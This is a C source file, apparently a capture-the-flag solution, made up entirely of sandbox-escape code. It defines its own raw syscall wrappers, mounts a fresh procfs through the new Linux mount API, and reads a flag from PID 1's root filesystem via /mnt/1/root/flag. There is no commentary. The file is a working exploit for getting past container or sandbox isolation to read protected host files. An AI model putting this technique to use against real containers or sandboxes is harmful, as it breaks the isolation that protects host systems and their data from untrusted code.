#include <stdio.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <stdarg.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <linux/mount.h>
#include <linux/unistd.h>

#ifndef SYS_fsopen
#define SYS_fsopen 430
#endif
#ifndef SYS_fsmount
#define SYS_fsmount 432
#endif
#ifndef SYS_fsconfig
#define SYS_fsconfig 431
#endif
#ifndef SYS_move_mount
#define SYS_move_mount 429
#endif
#ifndef O_TMPFILE
#define O_TMPFILE (020000000 | O_DIRECTORY)
#endif

long syscall(long number, ...) {
    va_list args;
    va_start(args, number);
    long _1 = va_arg(args, long);
    long _2 = va_arg(args, long);
    long _3 = va_arg(args, long);
    long _4 = va_arg(args, long);
    long _5 = va_arg(args, long);
    long _6 = va_arg(args, long);
    va_end(args);

    long retval;
    register long r10 __asm__ ("r10") = _4;
    register long r8  __asm__ ("r8")  = _5;
    register long r9  __asm__ ("r9")  = _6;
    __asm__ volatile ( "syscall"
             : "=a" (retval)
             : "a" (number), "D" (_1), "S" (_2), "d" (_3), "r" (r10), "r" (r8), "r" (r9)
             : "rcx", "r11", "cc", "memory");
    return retval;
}

int open(const char *path, int oflag, ...) {
    va_list args;
    va_start(args, oflag);
    mode_t mode = (oflag & (O_CREAT | O_TMPFILE)) ? va_arg(args, mode_t) : 0;
    va_end(args);
    return syscall(SYS_open, path, oflag, mode);
}

ssize_t read(int fd, void *buf, size_t nbytes) {
    return (ssize_t)syscall(SYS_read, fd, buf, nbytes);
}

ssize_t write(int fd, const void *buf, size_t nbytes) {
    return (ssize_t)syscall(SYS_write, fd, buf, nbytes);
}

int close(int fd) {
    return syscall(SYS_close, fd);
}

void _exit(int code) {
    while(1) syscall(SYS_exit, code);
}

int execve(const char *pathname, char *const argv[], char *const envp[]) {
    return syscall(SYS_execve, (long) pathname, (long) argv, (long) envp);
}

int fsopen(const char *fs_name, unsigned int flags) {
    return syscall(SYS_fsopen, (long) fs_name, (long) flags);
}

int fsmount(int fsfd, unsigned int flags, unsigned int ms_flags) {
    return syscall(SYS_fsmount, (long) fsfd, (long)  flags, (long) ms_flags);
}

int fsconfig(int fsfd, unsigned int cmd, const char *key, const void *value, int aux)
{
    return syscall(SYS_fsconfig, (long) fsfd, (long) cmd, (long) key, (long) value, (long) aux);
}

int move_mount(int from_dfd, const char *from_pathname, int to_dfd, const char *to_pathname, unsigned int flags) {
    return syscall(SYS_move_mount, (long) from_dfd, (long) from_pathname, (long) to_dfd,(long)  to_pathname, (long) flags);
}

int mkdir(const char *pathname, int mode) {
    return syscall(SYS_mkdir, (long) pathname, (long) mode);
}

void _start(void) {
    int fsfd, mfd;
    fsfd = fsopen("proc", FSOPEN_CLOEXEC);
    if (fsfd < 0) _exit(1);

    //fsconfig(fsfd, FSCONFIG_SET_STRING, "source", "/dev/sdb1", 0);
    fsconfig(fsfd, FSCONFIG_CMD_CREATE, NULL, NULL, 0);
    mfd = fsmount(fsfd, FSMOUNT_CLOEXEC, MOUNT_ATTR_RELATIME);
    close(fsfd);

    mkdir("/mnt", 0777);
    if (move_mount(mfd, "", AT_FDCWD, "/mnt", MOVE_MOUNT_F_EMPTY_PATH) < 0) _exit(2);

    close(mfd);

    int fd = open("/mnt/1/root/flag", O_RDONLY);
    if (fd >= 0) {
            char buf[100];
            int len = read(fd, buf, 100);
            write(1, buf, len);
            close(fd);
    }
    _exit(0);
}